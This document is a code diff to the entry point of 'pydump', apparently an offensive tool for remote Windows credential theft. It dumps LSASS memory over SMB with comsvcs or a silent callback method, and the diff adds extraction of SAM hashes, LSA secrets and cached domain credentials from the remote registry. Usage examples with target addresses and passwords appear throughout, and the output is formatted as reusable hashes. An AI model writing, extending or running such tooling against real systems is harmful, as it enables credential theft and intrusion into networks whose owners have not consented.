@@ -6,6 +6,7 @@ import os
 
 from .smb import SmbSession
 from .dump.methods import ComSvcsDump, SilentDump
+from .secrets.registry import RegistrySecrets
 from .parser.minidump import parse
 from .parser.extract import CredentialExtractor
 
@@ -13,18 +14,21 @@ from .parser.extract import CredentialExtractor
 def main():
     parser = argparse.ArgumentParser(
         prog="pydump",
-        description="Remote LSASS dump and credential extraction",
+        description="Remote credential extraction (registry + LSASS)",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 examples:
-  # Dump LSASS and extract credentials in one shot
+  # Full extraction: registry secrets + LSASS dump
   pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -d CORP
 
-  # Dump using the silent (TCP callback) method
-  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -m silent --lhost 192.168.1.10
+  # Registry only (no execution on target)
+  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' --method registry
 
-  # Just dump (save .dmp locally without parsing)
-  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -o lsass.dmp --no-parse
+  # LSASS only (comsvcs method)
+  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' --method comsvcs
+
+  # Save LSASS dump to file
+  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -o lsass.dmp
 
   # Parse an existing dump file
   pydump parse -f lsass.dmp
@@ -34,22 +38,21 @@ examples:
     subparsers = parser.add_subparsers(dest="command")
 
     # ─── dump command ───────────────────────────────────────────────────────
-    dump_parser = subparsers.add_parser("dump", help="Dump LSASS from a remote target")
+    dump_parser = subparsers.add_parser("dump", help="Extract credentials from a remote target")
     dump_parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
-    dump_parser.add_argument("-u", "--username", required=True, help="Username for authentication")
+    dump_parser.add_argument("-u", "--username", required=True, help="Username")
     dump_parser.add_argument("-p", "--password", required=True, help="Password")
     dump_parser.add_argument("-d", "--domain", default=".", help="Domain (default: local)")
     dump_parser.add_argument(
         "-m", "--method",
-        choices=["comsvcs", "silent"],
-        default="comsvcs",
-        help="Dump method (default: comsvcs)",
+        choices=["auto", "registry", "comsvcs", "silent"],
+        default="auto",
+        help="Method: auto (registry+lsass), registry (no exec), comsvcs, silent",
     )
-    dump_parser.add_argument("--pid", type=int, default=None, help="LSASS PID (auto-detected if omitted)")
-    dump_parser.add_argument("--lhost", default=None, help="Local IP for callback (silent method)")
-    dump_parser.add_argument("--lport", type=int, default=0, help="Local port for callback (0=auto)")
-    dump_parser.add_argument("-o", "--output", default=None, help="Save raw dump to file")
-    dump_parser.add_argument("--no-parse", action="store_true", help="Don't parse credentials, just dump")
+    dump_parser.add_argument("--pid", type=int, default=None, help="LSASS PID (auto-detected)")
+    dump_parser.add_argument("--lhost", default=None, help="Listen IP (silent method)")
+    dump_parser.add_argument("--lport", type=int, default=0, help="Listen port (silent method)")
+    dump_parser.add_argument("-o", "--output", default=None, help="Save raw LSASS dump to file")
 
     # ─── parse command ──────────────────────────────────────────────────────
     parse_parser = subparsers.add_parser("parse", help="Parse an existing minidump file")
@@ -67,42 +70,116 @@ examples:
 
 
 def cmd_dump(args):
-    """Execute remote dump and optionally parse credentials."""
+    """Full credential extraction: registry + LSASS."""
     print(f"[*] Connecting to {args.target}...")
 
     with SmbSession(args.target, args.username, args.password, args.domain) as session:
         print(f"[+] Authenticated as {args.domain}\\{args.username}")
 
-        # Select dump method
-        if args.method == "comsvcs":
-            method = ComSvcsDump(session)
-        elif args.method == "silent":
-            if not args.lhost:
-                print("[!] --lhost is required for silent method")
-                sys.exit(1)
-            method = SilentDump(session)
-        else:
-            print(f"[!] Unknown method: {args.method}")
-            sys.exit(1)
+        do_registry = args.method in ("auto", "registry")
+        do_lsass = args.method in ("auto", "comsvcs", "silent")
 
-        print(f"[*] Dumping LSASS using method: {args.method}")
+        # ─── Registry secrets ───────────────────────────────────────────
+        if do_registry:
+            _dump_registry(session)
 
-        if args.method == "silent":
+        # ─── LSASS dump ─────────────────────────────────────────────────
+        if do_lsass:
+            _dump_lsass(session, args)
+
+
+def _dump_registry(session: SmbSession):
+    """Extract secrets from remote registry."""
+    print()
+    print("── Registry Secrets ─────────────────────────────────────────")
+    reg_secrets = RegistrySecrets(session)
+
+    # Ensure service is running
+    try:
+        reg_secrets.ensure_remote_registry()
+        print("[+] Remote Registry service ready")
+    except RuntimeError as e:
+        print(f"[!] Cannot start Remote Registry: {e}")
+        return
+
+    try:
+        # SAM hashes
+        try:
+            hashes = reg_secrets.dump_sam()
+            if hashes:
+                print(f"[+] SAM hashes ({len(hashes)}):")
+                for h in hashes:
+                    print(f"    {h.username}:{h.rid}:{h.lm_hash or 'aad3b435b51404ee'}:{h.ntlm_hash}:::")
+            else:
+                print("[-] No SAM hashes found")
+        except RuntimeError as e:
+            print(f"[!] SAM extraction failed: {e}")
+
+        # LSA Secrets
+        try:
+            secrets = reg_secrets.dump_lsa_secrets()
+            if secrets:
+                print(f"[+] LSA Secrets ({len(secrets)}):")
+                for s in secrets:
+                    print(f"    {s.name}: {s.decoded}")
+            else:
+                print("[-] No LSA secrets found")
+        except RuntimeError as e:
+            print(f"[!] LSA secrets failed: {e}")
+
+        # Cached creds
+        try:
+            cached = reg_secrets.dump_cached_creds()
+            if cached:
+                print(f"[+] Cached credentials ({len(cached)}):")
+                for c in cached:
+                    print(f"    {c.domain}\\{c.username}:{c.hash_hex}")
+            else:
+                print("[-] No cached credentials")
+        except RuntimeError as e:
+            print(f"[!] Cached creds failed: {e}")
+    finally:
+        reg_secrets.cleanup_remote_registry()
+        print("[*] Remote Registry service restored")
+
+
+def _dump_lsass(session: SmbSession, args):
+    """Dump LSASS memory and extract credentials."""
+    print()
+    print("── LSASS Memory ─────────────────────────────────────────────")
+
+    method_name = args.method if args.method not in ("auto", "registry") else "comsvcs"
+
+    if method_name == "comsvcs":
+        method = ComSvcsDump(session)
+    elif method_name == "silent":
+        if not args.lhost:
+            print("[!] --lhost required for silent method")
+            return
+        method = SilentDump(session)
+    else:
+        method = ComSvcsDump(session)
+
+    print(f"[*] Method: {method_name}")
+
+    try:
+        if method_name == "silent":
             dump_data = method.execute(lsass_pid=args.pid, listen_port=args.lport)
         else:
             dump_data = method.execute(lsass_pid=args.pid)
+    except RuntimeError as e:
+        print(f"[!] LSASS dump failed: {e}")
+        print("    (Target may have ASR rules blocking process execution)")
+        return
 
-        print(f"[+] Received {len(dump_data)} bytes")
+    print(f"[+] Received {len(dump_data)} bytes")
 
-        # Save to file if requested
-        if args.output:
-            with open(args.output, "wb") as f:
-                f.write(dump_data)
-            print(f"[+] Saved to {args.output}")
+    if args.output:
+        with open(args.output, "wb") as f:
+            f.write(dump_data)
+        print(f"[+] Saved to {args.output}")
 
-        # Parse credentials
-        if not args.no_parse:
-            _parse_and_display(dump_data)
+    _parse_and_display(dump_data)
 
 
 def cmd_parse(args):
@@ -135,7 +212,7 @@ def _parse_and_display(dump_data: bytes):
         credentials = extractor.extract()
     except RuntimeError as e:
         print(f"[!] {e}")
-        sys.exit(1)
+        return
 
     if not credentials:
         print("[-] No credentials found")
